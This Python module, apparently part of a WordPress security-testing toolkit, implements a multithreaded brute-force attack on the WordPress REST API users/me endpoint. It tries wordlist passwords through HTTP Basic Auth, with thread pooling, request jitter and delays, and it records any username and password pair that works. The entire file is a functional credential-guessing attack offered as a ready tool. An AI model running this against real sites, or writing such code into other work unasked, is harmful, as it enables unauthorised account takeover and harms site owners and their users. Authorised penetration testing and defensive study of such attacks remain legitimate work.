"""attacks/restapi.py — WordPress REST API brute-force."""
from __future__ import annotations
import logging, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from requests.auth import HTTPBasicAuth
from ..base import WordPressTesterBase, Credential

log       = logging.getLogger(__name__)
_API_PATH = "/wp-json/wp/v2/users/me"
_CHUNK    = 500


def _is_success(resp) -> bool:
    if resp is None or resp.status_code != 200:
        return False
    if "json" not in resp.headers.get("Content-Type", ""):
        return False
    try:
        body = resp.json()
        return isinstance(body, dict) and "id" in body
    except ValueError:
        return False


def _chunks(path: Path, size: int):
    chunk = []
    with path.open(errors="ignore") as fh:
        for raw in fh:
            w = raw.strip()
            if not w or w.startswith("#"):
                continue
            chunk.append(w)
            if len(chunk) >= size:
                yield chunk; chunk = []
    if chunk:
        yield chunk


def _progress(tested: int, chunk_num: int, username: str) -> None:
    filled = min(chunk_num % 20, 20)
    bar    = "█" * filled + "░" * (20 - filled)
    line   = (f"\r  [RESTAPI] user={username}  chunk={chunk_num:>4}  "
              f"tested≈{tested:>6}  [{bar}]  no match yet   ")
    sys.stdout.write(line)
    sys.stdout.flush()


class RestAPIAttack(WordPressTesterBase):
    """Brute-force via REST API Basic Auth."""

    def run(self) -> list[Credential]:
        if not self.usernames:
            log.warning("[RESTAPI] No usernames"); return []
        url  = f"{self.target}{_API_PATH}"
        resp = self._request("GET", url, jitter=False)
        if not (resp and resp.status_code in (401, 403)):
            log.error("[RESTAPI] Endpoint not available or not auth-protected"); return []
        print(f"[RESTAPI] Endpoint confirmed \u2705  starting attack...\n")
        for username in self.usernames:
            cred = self.attack(username, url=url)
            if cred and self.config.get("stop_on_first", True):
                break
        return self.found_credentials

    def attack(self, username: str, *, url: str | None = None) -> Credential | None:
        if not self.wordlist:
            log.error("[RESTAPI] No wordlist"); return None
        url  = url or f"{self.target}{_API_PATH}"
        wl   = Path(self.wordlist)
        n    = int(self.config.get("threads", 5))
        if not wl.is_file():
            raise FileNotFoundError(wl)

        print(f"[RESTAPI] Attacking '{username}'  threads={n}")

        stop      = threading.Event()
        found     = None
        tested    = 0
        chunk_num = 0

        with ThreadPoolExecutor(max_workers=n, thread_name_prefix="restapi") as pool:
            for chunk in _chunks(wl, _CHUNK):
                if stop.is_set():
                    break
                chunk_num += 1
                futures = {pool.submit(self._check, username, pwd, url, stop): pwd
                           for pwd in chunk}
                for future in as_completed(futures):
                    pwd = futures[future]
                    tested += 1
                    try:
                        ok = future.result()
                    except Exception as e:
                        log.debug("[RESTAPI] Worker error: %s", e); continue
                    if ok:
                        stop.set()
                        sys.stdout.write("\r" + " " * 80 + "\r")
                        sys.stdout.flush()
                        print(f"\n  [!!!] SUCCESS  {username}:{pwd}\n")
                        found = self._add_credential(username, pwd, note="rest-api")
                        for f in futures: f.cancel()
                        break

                if not stop.is_set():
                    _progress(tested, chunk_num, username)
                    time.sleep(self.delay)

        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.flush()
        if not found:
            print(f"  [RESTAPI] '{username}' — wordlist exhausted ({tested} passwords tested), no match.")
        return found

    def _check(self, username: str, password: str, url: str,
               stop: threading.Event) -> bool:
        if stop.is_set():
            return False
        resp = self._request("GET", url, auth=HTTPBasicAuth(username, password), jitter=True)
        return _is_success(resp)
